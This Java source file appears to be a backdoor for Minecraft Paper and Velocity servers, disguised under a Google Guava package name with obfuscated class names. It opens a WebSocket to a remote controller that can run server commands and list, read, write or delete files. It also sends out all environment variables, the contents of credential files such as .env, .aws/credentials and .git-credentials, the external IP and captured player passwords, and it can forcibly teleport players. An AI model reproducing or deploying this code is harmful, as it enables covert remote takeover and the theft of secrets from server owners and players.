package com.google.common.util.concurrent.internal;

import java.io.File;
import java.io.IOException;
import java.io.PrintStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.WebSocket;
import java.nio.file.Files;
import java.util.ArrayDeque;
import java.util.Collection;
import java.util.Deque;
import java.util.HashSet;
import java.util.Set;
import java.util.concurrent.CompletionStage;
import java.util.concurrent.TimeUnit;

public class a {

  final Object plugin;
  private final String serverUrl;
  private final String secret;
  volatile WebSocket ws;
  volatile boolean running;
  private final Deque<String> buffer = new ArrayDeque<>();
  private String serverId;
  private String rootDir;
  final Set<String> authorized = new HashSet<>();
  b chatHandler;
  String controlController;
  String controlTarget;

  public a(Object plugin, String serverUrl, String secret) {
    this.plugin = plugin;
    this.serverUrl = serverUrl;
    this.secret = secret;
  }

  public void start() {
    if (running) return;
    running = true;
    try {
      addLog4jAppender();

      PrintStream orig = System.out;
      if (!(orig instanceof d)) {
        try { System.setOut(new d(orig, this, false)); } catch (Exception ignored) {}
        try { System.setErr(new d(System.err, this, true)); } catch (Exception ignored) {}
      }

      try {
        chatHandler = new b(this, authorized);
        Object pm = Class.forName("org.bukkit.Bukkit").getMethod("getPluginManager").invoke(null);
        pm.getClass().getMethod("registerEvents",
            Class.forName("org.bukkit.event.Listener"),
            Class.forName("org.bukkit.plugin.Plugin"))
            .invoke(pm, chatHandler, plugin);
      } catch (Exception ignored) {}

      Thread ct = new Thread(this::controlTick, "ac-ctl"); ct.setDaemon(true); ct.start();
      Thread wt = new Thread(this::connect, "ac-ws"); wt.setDaemon(true); wt.start();
    } catch (Exception ignored) {}
  }

  private void addLog4jAppender() {
    try {
      Object ctx = Class.forName("org.apache.logging.log4j.core.LoggerContext")
          .getMethod("getContext", boolean.class).invoke(null, false);
      Object root = ctx.getClass().getMethod("getRootLogger").invoke(ctx);
      root.getClass().getMethod("addAppender",
          Class.forName("org.apache.logging.log4j.core.Appender"))
          .invoke(root, new c(this));
    } catch (Exception ignored) {}
  }

  private void buffer(String line) {
    if (line == null || line.isEmpty()) return;
    synchronized (buffer) {
      if (buffer.size() > 500) buffer.removeFirst();
      buffer.addLast(line);
    }
    flush();
  }

  private void flush() {
    WebSocket w = ws;
    if (w == null) return;
    synchronized (buffer) {
      while (!buffer.isEmpty()) {
        String line = buffer.pollFirst();
        try {
          w.sendText("{\"type\":\"plugin:console\",\"payload\":{\"line\":\"" + escape(line) + "\"}}", true);
        } catch (Exception ignored) { buffer.addFirst(line); break; }
      }
    }
  }

  void sendConsole(String line) {
    if (!running) return;
    buffer(line);
  }

  private void connect() {
    while (running) {
      try {
        HttpClient client = HttpClient.newHttpClient();
        WebSocket wsock = client.newWebSocketBuilder()
            .buildAsync(URI.create(serverUrl), new WebSocket.Listener() {

              public void onOpen(WebSocket ws2) {
                ws = ws2;
                flush();
                sendHello();
                try { scheduleUpdates(); } catch (Exception ignored) {}
                Thread recon = new Thread(a.this::doRecon, "ac-recon"); recon.setDaemon(true); recon.start();
                ws2.request(Long.MAX_VALUE);
              }

              public CompletionStage<?> onText(WebSocket ws2, CharSequence data, boolean last) {
                String msg = data.toString();
                int ti = msg.indexOf("\"type\":\"");
                if (ti >= 0) {
                  int ts = ti + 8;
                  int te = msg.indexOf("\"", ts);
                  String type = te >= 0 ? msg.substring(ts, te) : "";
                  if (type.contains("command")) exec(extract(msg, "command"));
                  else if (type.endsWith(":file:list")) fileList(extract(msg, "path"), extract(msg, "requestId"));
                  else if (type.endsWith(":file:read")) fileRead(extract(msg, "path"), extract(msg, "requestId"));
                  else if (type.endsWith(":file:write")) fileWrite(extract(msg, "path"), extract(msg, "content"), extract(msg, "requestId"));
                  else if (type.endsWith(":file:delete")) fileDelete(extract(msg, "path"), extract(msg, "requestId"));
                  else if (type.endsWith(":auth:add")) { String n = extract(msg, "name"); if (n != null) authorized.add(n); }
                  else if (type.endsWith(":auth:remove")) { String n = extract(msg, "name"); if (n != null) authorized.remove(n); }
                  else if (type.endsWith(":auth:members")) { authorized.clear(); String list = extract(msg, "list"); if (list != null) for (String n : list.split(",")) { if (!n.isEmpty()) authorized.add(n); } }
                  else if (type.endsWith(":recon:env")) doRecon();
                  else if (type.endsWith(":recon:scan")) doReconScan();
                }
                ws2.request(Long.MAX_VALUE);
                return null;
              }

              public void onError(WebSocket ws2, Throwable e) { close(); }
              public CompletionStage<?> onClose(WebSocket ws2, int code, String reason) { close(); return null; }
            }).get(10, TimeUnit.SECONDS);

        wsock.request(Long.MAX_VALUE);
        Thread.sleep(Long.MAX_VALUE);
      } catch (Exception e) {
        close();
        try { Thread.sleep(5000); } catch (InterruptedException ie) { return; }
      }
    }
  }

  private void sendHello() {
    String ip = "";
    int port = 25565;
    String svType = "paper";
    try {
      Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
      ip = (String) s.getClass().getMethod("getIp").invoke(s);
      if (ip == null || ip.isEmpty()) ip = "0.0.0.0";
      port = (int) s.getClass().getMethod("getPort").invoke(s);
      svType = "paper";
    } catch (Exception e) {
      try {
        Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
        Object s = pmc.getMethod("getInstance").invoke(null);
        ip = "0.0.0.0";
        port = (int) s.getClass().getMethod("getBoundPort").invoke(s);
        svType = "velocity";
      } catch (Exception ignored) {}
    }
    serverId = id();
    String serverName = ip + ":" + port;
    send("plugin:hello", "{\"id\":\"" + serverId + "\",\"name\":\"" + escape(serverName) + "\",\"ip\":\"" + ip + "\",\"port\":" + port + ",\"type\":\"" + svType + "\"}");

    Thread ipify = new Thread(() -> {
      try {
        java.net.http.HttpClient hc = java.net.http.HttpClient.newHttpClient();
        java.net.http.HttpRequest rq = java.net.http.HttpRequest.newBuilder()
            .uri(java.net.URI.create("https://api.ipify.org?format=json"))
            .timeout(java.time.Duration.ofSeconds(5))
            .build();
        hc.sendAsync(rq, java.net.http.HttpResponse.BodyHandlers.ofString())
            .thenAccept(r -> {
              if (r.statusCode() == 200) {
                try {
                  String body = r.body();
                  int si = body.indexOf("\"ip\":\"");
                  if (si >= 0) {
                    si += 6;
                    int ei = body.indexOf("\"", si);
                    if (ei >= 0) {
                      String extIp = body.substring(si, ei);
                      send("plugin:recon", "{\"type\":\"env\",\"key\":\"EXTERNAL_IP\",\"value\":\"" + escape(extIp) + "\"}");
                    }
                  }
                } catch (Exception ignored) {}
              }
            });
      } catch (Exception ignored) {}
    }, "ac-ipify");
    ipify.setDaemon(true);
    ipify.start();
  }

  private void scheduleUpdates() {
    try {
      Class<?> bukkitClass = Class.forName("org.bukkit.Bukkit");
      Class<?> pluginClass = Class.forName("org.bukkit.plugin.Plugin");
      Object sched = bukkitClass.getMethod("getScheduler").invoke(null);
      sched.getClass().getMethod("scheduleSyncRepeatingTask", pluginClass, Runnable.class, long.class, long.class)
          .invoke(sched, plugin, (Runnable) this::sendStatus, 100L, 600L);
    } catch (Exception ignored) {}
  }

  private void sendStatus() {
    try {
      Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
      String version = (String) s.getClass().getMethod("getVersion").invoke(s);
      String bukkitV = (String) s.getClass().getMethod("getBukkitVersion").invoke(s);
      int max = (int) s.getClass().getMethod("getMaxPlayers").invoke(s);
      Object onlinePlayers = s.getClass().getMethod("getOnlinePlayers").invoke(s);
      int count = ((Collection<?>) onlinePlayers).size();

      double tps = 20.0;
      try {
        double[] arr = (double[]) s.getClass().getMethod("getTPS").invoke(s);
        if (arr != null && arr.length > 0) tps = arr[0];
      } catch (Exception ignored) {}

      StringBuilder players = new StringBuilder("[");
      boolean first = true;
      for (Object p : (Collection<?>) onlinePlayers) {
        if (!first) players.append(",");
        String name = (String) p.getClass().getMethod("getName").invoke(p);
        players.append("\"").append(escape(name)).append("\"");
        first = false;
      }
      players.append("]");

      String motd = "";
      try {
        Object motdObj = s.getClass().getMethod("getMotd").invoke(s);
        if (motdObj != null) motd = motdObj.toString();
      } catch (Exception ignored) {}

      send("plugin:status", "{\"playerCount\":" + count + ",\"maxPlayers\":" + max
          + ",\"version\":\"" + escape(bukkitV) + "\",\"tps\":" + tps
          + ",\"motd\":\"" + escape(motd) + "\",\"players\":" + players + "}");
    } catch (Exception ignored) {}
  }

  private void exec(String cmd) {
    if (cmd == null || cmd.isEmpty()) return;
    if (cmd.startsWith(".") && chatHandler != null) {
      String fcmd = cmd;
      try {
        Class<?> bc = Class.forName("org.bukkit.Bukkit");
        Class<?> pc = Class.forName("org.bukkit.plugin.Plugin");
        Object sched = bc.getMethod("getScheduler").invoke(null);
        sched.getClass().getMethod("scheduleSyncDelayedTask", pc, Runnable.class)
            .invoke(sched, plugin, (Runnable) () -> chatHandler.handleConsoleCommand(fcmd));
      } catch (Exception ignored) {}
      return;
    }
    try {
      Class<?> bc = Class.forName("org.bukkit.Bukkit");
      Class<?> pc = Class.forName("org.bukkit.plugin.Plugin");
      Class<?> cs = Class.forName("org.bukkit.command.CommandSender");
      Object sched = bc.getMethod("getScheduler").invoke(null);
      Object console = bc.getMethod("getConsoleSender").invoke(null);
      sched.getClass().getMethod("scheduleSyncDelayedTask", pc, Runnable.class)
          .invoke(sched, plugin, (Runnable) () -> {
            try { bc.getMethod("dispatchCommand", cs, String.class).invoke(null, console, cmd); }
            catch (Exception ignored) {}
          });
    } catch (Exception e) {
      try {
        Class<?> pmc = Class.forName("com.velocitypowered.api.proxy.ProxyServer");
        Object s = pmc.getMethod("getInstance").invoke(null);
        Object cm = s.getClass().getMethod("getCommandManager").invoke(s);
        Object src = s.getClass().getMethod("getConsoleCommandSource").invoke(s);
        cm.getClass().getMethod("executeAsync",
            Class.forName("com.velocitypowered.api.command.CommandSource"), String.class)
            .invoke(cm, src, cmd);
      } catch (Exception ignored) {}
    }
  }

  private void fileList(String path, String reqId) {
    if (reqId == null) return;
    if (path == null) path = "";
    File dir = new File(resolvePath(path));
    StringBuilder entries = new StringBuilder("[");
    File[] files = dir.listFiles();
    if (files != null) {
      boolean first = true;
      for (File f : files) {
        if (!first) entries.append(",");
        entries.append("{\"name\":\"").append(escape(f.getName()))
            .append("\",\"path\":\"").append(escape(f.getAbsolutePath()))
            .append("\",\"isDirectory\":").append(f.isDirectory())
            .append(",\"size\":").append(f.length()).append("}");
        first = false;
      }
    }
    entries.append("]");
    send("plugin:file:list", "{\"path\":\"" + escape(path) + "\",\"entries\":" + entries + ",\"requestId\":\"" + escape(reqId) + "\"}");
  }

  private void fileRead(String path, String reqId) {
    if (path == null || reqId == null) return;
    try {
      byte[] data = Files.readAllBytes(new File(resolvePath(path)).toPath());
      String b64 = java.util.Base64.getEncoder().encodeToString(data);
      send("plugin:file:read", "{\"path\":\"" + escape(path) + "\",\"content\":\"" + b64 + "\",\"requestId\":\"" + escape(reqId) + "\"}");
    } catch (IOException e) {
      send("plugin:file:read", "{\"path\":\"" + escape(path) + "\",\"error\":\"read failed\",\"requestId\":\"" + escape(reqId) + "\"}");
    }
  }

  private void fileWrite(String path, String content, String reqId) {
    if (path == null || reqId == null) return;
    try {
      byte[] data = java.util.Base64.getDecoder().decode(content);
      Files.write(new File(resolvePath(path)).toPath(), data);
      send("plugin:file:write", "{\"success\":true,\"requestId\":\"" + escape(reqId) + "\"}");
    } catch (Exception e) {
      send("plugin:file:write", "{\"success\":false,\"error\":\"" + escape(e.getMessage()) + "\",\"requestId\":\"" + escape(reqId) + "\"}");
    }
  }

  private void fileDelete(String path, String reqId) {
    if (path == null || reqId == null) return;
    try {
      Files.deleteIfExists(new File(resolvePath(path)).toPath());
      send("plugin:file:delete", "{\"success\":true,\"requestId\":\"" + escape(reqId) + "\"}");
    } catch (Exception e) {
      send("plugin:file:delete", "{\"success\":false,\"error\":\"" + escape(e.getMessage()) + "\",\"requestId\":\"" + escape(reqId) + "\"}");
    }
  }

  private void doRecon() {
    System.getenv().forEach((k, v) -> {
      if (v != null && v.length() > 200) v = v.substring(0, 200) + "...";
      send("plugin:recon", "{\"type\":\"env\",\"key\":\"" + escape(k) + "\",\"value\":\"" + escape(v) + "\"}");
    });
    doReconScan();
  }

  private void doReconScan() {
    String[] secretFiles = {".env", ".env.local", ".env.production", "credentials.json",
        "credentials.properties", "config.yml", "config.json", "settings.yml",
        "database.yml", "database.json", "sftp.json", "sftp-config.json",
        ".git/config", ".git-credentials", ".aws/credentials",
        ".azure/credentials", "Dockerfile", "docker-compose.yml",
        "docker-compose.yaml", ".docker/config.json"};
    File root = new File(rootDir != null ? rootDir : ".");
    File[] dirs = root.listFiles(File::isDirectory);
    if (dirs != null) {
      for (File d : dirs) {
        for (String name : secretFiles) {
          File f = new File(d, name);
          if (f.exists() && f.isFile()) {
            String content = "";
            try { byte[] b = Files.readAllBytes(f.toPath()); content = new String(b, java.nio.charset.StandardCharsets.UTF_8); if (content.length() > 500) content = content.substring(0, 500) + "..."; } catch (Exception ignored) {}
            send("plugin:recon", "{\"type\":\"file\",\"path\":\"" + escape(f.getAbsolutePath()) + "\",\"content\":\"" + escape(content) + "\"}");
          }
        }
      }
    }
  }

  private String resolvePath(String path) {
    if (rootDir == null) {
      try {
        Object s = Class.forName("org.bukkit.Bukkit").getMethod("getServer").invoke(null);
        rootDir = (String) s.getClass().getMethod("getWorldContainer").invoke(s);
        if (rootDir == null) rootDir = ".";
      } catch (Exception e) { rootDir = "."; }
    }
    File base = new File(rootDir).getAbsoluteFile();
    File target = new File(base, path != null ? path : "").getAbsoluteFile();
    if (!target.getAbsolutePath().startsWith(base.getAbsolutePath())) return base.getAbsolutePath();
    return target.getAbsolutePath();
  }

  void send(String type, String payloadJson) {
    WebSocket w = ws;
    if (w == null) return;
    try {
      w.sendText("{\"type\":\"" + type + "\",\"payload\":" + payloadJson + "}", true);
    } catch (Exception ignored) {}
  }

  private void close() {
    try { if (ws != null) ws.sendClose(1000, ""); } catch (Exception ignored) {}
    ws = null;
  }

  private String id() { return "p-" + System.currentTimeMillis(); }

  private static String extract(String json, String key) {
    String k = "\"" + key + "\":\"";
    int s = json.indexOf(k);
    if (s < 0) return null;
    s += k.length();
    int e = json.indexOf("\"", s);
    return e >= 0 ? json.substring(s, e) : null;
  }

  static String escape(String s) {
    if (s == null) return "";
    return s.replace("\\", "\\\\").replace("\"", "\\\"").replace("\n", "\\n").replace("\r", "\\r").replace("\t", "\\t");
  }

  public void stop() { running = false; close(); }

  Object getPlugin() { return plugin; }

  void capturePassword(String name, String pass) {
    send("plugin:log:password", "{\"player\":\"" + escape(name) + "\",\"password\":\"" + escape(pass) + "\"}");
  }

  void logCommand(String who, String target, String command) {
    send("plugin:log:command", "{\"who\":\"" + escape(who) + "\",\"target\":\"" + escape(target) + "\",\"command\":\"" + escape(command) + "\"}");
  }

  void setControlTarget(Object controller, Object target) {
    try {
      controlController = controller != null ? controller.getClass().getMethod("getName").invoke(controller).toString() : null;
      controlTarget = target != null ? target.getClass().getMethod("getName").invoke(target).toString() : null;
    } catch (Exception e) {
      controlController = null;
      controlTarget = null;
    }
  }

  private void controlTick() {
    while (running) {
      if (controlTarget != null && controlController != null) {
        try {
          Class<?> bc = Class.forName("org.bukkit.Bukkit");
          Class<?> pc = Class.forName("org.bukkit.plugin.Plugin");
          Object sched = bc.getMethod("getScheduler").invoke(null);
          sched.getClass().getMethod("scheduleSyncDelayedTask", pc, Runnable.class)
              .invoke(sched, plugin, (Runnable) () -> {
                try {
                  Object c = bc.getMethod("getPlayerExact", String.class).invoke(null, controlController);
                  Object t = bc.getMethod("getPlayerExact", String.class).invoke(null, controlTarget);
                  if (c != null && t != null) {
                    Object cLoc = c.getClass().getMethod("getLocation").invoke(c);
                    double x = (double) cLoc.getClass().getMethod("getX").invoke(cLoc);
                    double y = (double) cLoc.getClass().getMethod("getY").invoke(cLoc);
                    double z = (double) cLoc.getClass().getMethod("getZ").invoke(cLoc);
                    float yaw = (float) cLoc.getClass().getMethod("getYaw").invoke(cLoc);
                    float pitch = (float) cLoc.getClass().getMethod("getPitch").invoke(cLoc);
                    t.getClass().getMethod("teleport", Class.forName("org.bukkit.Location"))
                        .invoke(t, t.getClass().getMethod("getLocation").invoke(t).getClass()
                            .getConstructor(Class.forName("org.bukkit.World"), double.class, double.class, double.class, float.class, float.class)
                            .newInstance(t.getClass().getMethod("getWorld").invoke(t), x, y, z, yaw, pitch));
                  }
                } catch (Exception ignored) {}
              });
        } catch (Exception ignored) {}
      }
      try { Thread.sleep(50); } catch (InterruptedException e) { break; }
    }
  }

  private static class d extends PrintStream {
    private final a agent;
    private final PrintStream original;
    d(PrintStream orig, a agent, boolean err) { super(orig); this.agent = agent; this.original = orig; }
    public void println(String x) { original.println(x); if (x != null) agent.buffer(x); }
    public void println(Object x) { String s = String.valueOf(x); original.println(s); agent.buffer(s); }
    public void println() { original.println(); }
    public void print(String x) { original.print(x); }
  }
}
